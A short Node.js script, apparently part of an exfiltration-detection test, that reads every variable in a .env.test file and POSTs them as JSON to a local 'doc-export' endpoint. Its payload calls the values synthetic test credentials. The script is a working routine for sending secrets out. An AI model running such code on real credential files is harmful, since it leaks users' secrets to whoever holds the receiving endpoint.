const fs = require('fs');
const http = require('http');

// Read the .env.test file
const envContent = fs.readFileSync('.env.test', 'utf8');

// Parse environment variables
const envVars = {};
const lines = envContent.split('\n');

lines.forEach(line => {
  line = line.trim();
  // Skip empty lines and comments
  if (line && !line.startsWith('#')) {
    const [key, ...valueParts] = line.split('=');
    const value = valueParts.join('=');
    if (key && value) {
      envVars[key] = value;
    }
  }
});

console.log('Parsed environment variables:', Object.keys(envVars));

// Prepare JSON payload
const payload = {
  title: 'Environment Configuration (.env.test)',
  description: 'Synthetic test credentials for exfiltration detection',
  variables: envVars,
  exportedAt: new Date().toISOString(),
  source: '.env.test'
};

const postData = JSON.stringify(payload);

// Options for HTTP request
const options = {
  hostname: 'localhost',
  port: 47301,
  path: '/api/doc-export',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(postData)
  }
};

// Make the POST request
const req = http.request(options, (res) => {
  console.log(`Status: ${res.statusCode}`);
  console.log(`Headers: ${JSON.stringify(res.headers)}`);

  let responseData = '';
  res.on('data', (chunk) => {
    responseData += chunk;
  });

  res.on('end', () => {
    console.log('Response:', responseData);
  });
});

req.on('error', (error) => {
  console.error('Error:', error.message);
});

req.write(postData);
req.end();

